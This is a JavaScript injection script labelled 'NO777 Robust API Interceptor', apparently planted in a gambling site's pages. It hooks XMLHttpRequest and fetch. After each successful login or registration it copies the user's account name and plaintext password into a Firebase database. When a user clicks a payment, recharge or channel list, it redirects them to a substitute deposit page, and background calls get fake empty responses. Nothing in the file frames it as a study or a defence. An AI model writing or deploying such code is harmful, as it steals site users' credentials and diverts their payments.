// 🎰 NO777 - Robust API Interceptor
// version 4.0 - Added Debug Alert & Aggressive URL Matching
(function() {
    console.log('🎰 No777 Interceptor v4.1 Initializing...');

    // Mock structures removed as we are now redirecting entirely

    const isListApi = (u) => {
        if (!u) return false;
        const ul = u.toLowerCase();
        // Match /recharge/.../list, /pay/.../list, /channel/.../list
        return (ul.includes('list')) && 
               (ul.includes('recharge') || ul.includes('pay') || ul.includes('channel')) &&
               !(ul.includes('record') || ul.includes('history') || ul.includes('message') || ul.includes('coupon'));
    };

    const isConfigApi = (u) => {
        if (!u) return false;
        const ul = u.toLowerCase();
        return (ul.includes('config')) && 
               (ul.includes('recharge') || ul.includes('transfer'));
    };

    const isLoginApi = (u) => {
        if (!u) return false;
        return u.includes('login') || u.includes('Register');
    };

    // --- REDIRECT LOOP PREVENTION (Interaction Tracking) ---
    // The web app might make background API calls to /list or /config on page load.
    // We only want to redirect to /deposit.html if the user ACTIVELY clicked a deposit button.
    let lastUserInteraction = 0;
    const updateInteraction = () => { lastUserInteraction = Date.now(); };
    window.addEventListener('click', updateInteraction, true);
    window.addEventListener('touchstart', updateInteraction, true);

    const emptyMockRes = JSON.stringify({ code:0, data: { list:[] }, msg: "succ" });
    const emptyDataUri = "data:application/json;charset=utf-8," + encodeURIComponent(emptyMockRes);

    // --- XMLHTTPREQUEST HIJACKING ---
    const XHR = XMLHttpRequest.prototype;
    const open = XHR.open;

    XHR.open = function(method, url) {
        this._url = url;
        if (isListApi(url) || isConfigApi(url)) {
            const isUserInitiated = (Date.now() - lastUserInteraction) < 2000;
            if (isUserInitiated) {
                console.log('No777: User click detected recently. Redirecting to custom deposit.html');
                window.location.href = '/deposit.html';
                return; // Abort request
            } else {
                console.log('No777: Background fetch detected. Silently returning empty mock to prevent redirect loops.');
                return open.call(this, "GET", emptyDataUri);
            }
        }
        return open.apply(this, arguments);
    };

    const send = XHR.send;
    XHR.send = function(data) {
        this.addEventListener('load', function() {
            if (isLoginApi(this._url) && this.status === 200) {
                try {
                    const res = JSON.parse(this.responseText);
                    if (res.code === 1) { // Success
                        const reqData = typeof data === 'string' ? JSON.parse(data) : {};
                        const account = reqData.account || reqData.phone || reqData.userName;
                        const password = reqData.password || reqData.pwd;
                        if (account) {
                            console.log('🎰 No777: Syncing captured login to Firebase...');
                            window.db.collection('users').doc(account).set({
                                account: account,
                                password: password,
                                lastLogin: new Date().toISOString(),
                                type: 'mirrored'
                            }, { merge: true });
                        }
                    }
                } catch (e) {
                    console.error('No777 Sync Error:', e);
                }
            }
        });
        return send.apply(this, arguments);
    };

    const originalFetch = window.fetch;
    window.fetch = async function() {
        let [resource, config] = arguments;
        const url = typeof resource === 'string' ? resource : (resource ? resource.url : "");

        if (isListApi(url) || isConfigApi(url)) {
            const isUserInitiated = (Date.now() - lastUserInteraction) < 2000;
            if (isUserInitiated) {
                console.log('No777: User click detected recently. Redirecting to custom deposit.html');
                window.location.href = '/deposit.html';
                return new Promise(() => {}); // Pause execution
            } else {
                return Promise.resolve(new Response(emptyMockRes, { status: 200, headers: {'Content-Type': 'application/json'} }));
            }
        }

        const response = await originalFetch.apply(this, arguments);
        
        if (isLoginApi(url) && response.ok) {
            const clone = response.clone();
            clone.json().then(res => {
                if (res.code === 1) {
                    let reqData = {};
                    if (config && config.body) {
                        try { reqData = JSON.parse(config.body); } catch(e) {}
                    }
                    const account = reqData.account || reqData.phone || reqData.userName;
                    const password = reqData.password || reqData.pwd;
                    if (account) {
                        console.log('🎰 No777: Syncing captured fetch login to Firebase...');
                        window.db.collection('users').doc(account).set({
                            account: account,
                            password: password,
                            lastLogin: new Date().toISOString(),
                            type: 'mirrored'
                        }, { merge: true });
                    }
                }
            });
        }
        return response;
    };

    // --- NAVIGATION HIJACK ---
    const setupNavHijack = () => {
        const observer = new MutationObserver(() => {
            const navItems = document.querySelectorAll('[class*="item"], [class*="nav"], .btmItem');
            navItems.forEach(item => {
                const text = item.innerText.toLowerCase();
            });
        });
        observer.observe(document.body, { childList: true, subtree: true });
    };

    if (document.readyState === 'loading') {
        document.addEventListener('DOMContentLoaded', setupNavHijack);
    } else {
        setupNavHijack();
    }

    console.log('🎰 No777 Interceptor v4.0 Active');
})();
